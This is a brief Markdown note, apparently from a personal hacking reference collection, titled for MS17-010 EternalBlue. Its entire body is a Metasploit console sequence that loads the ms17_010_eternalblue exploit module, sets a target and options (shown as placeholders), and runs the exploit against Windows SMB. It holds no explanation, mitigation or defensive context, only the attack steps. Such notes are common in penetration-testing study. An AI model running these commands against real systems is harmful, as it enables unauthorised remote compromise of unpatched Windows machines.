---
id: MS17-010_EternalBlue
aliases: []
tags:
  - hacking
  - vulnerabilities
dg-publish: true
---

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > show targets
        ...targets...
msf exploit(ms17_010_eternalblue) > set TARGET < target-id >
msf exploit(ms17_010_eternalblue) > show options
        ...show and set options...
msf exploit(ms17_010_eternalblue) > exploit

```